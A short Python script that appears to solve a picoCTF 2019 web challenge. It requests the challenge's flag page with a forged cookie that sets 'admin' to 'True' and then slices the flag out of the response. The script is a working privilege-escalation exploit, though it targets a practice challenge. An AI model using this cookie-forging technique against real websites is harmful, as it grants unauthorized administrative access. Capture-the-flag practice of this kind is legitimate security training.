import requests

URL = "https://2019shell1.picoctf.com/problem/32270/flag"

COOKIES = {'password': '', 'username': '', 'admin': 'True'}

response = requests.get(url=URL, cookies=COOKIES)

data = response.text

flagIndex = data.index('picoCTF{') + 8

flag = data[flagIndex:flagIndex + 29]

print(flag)
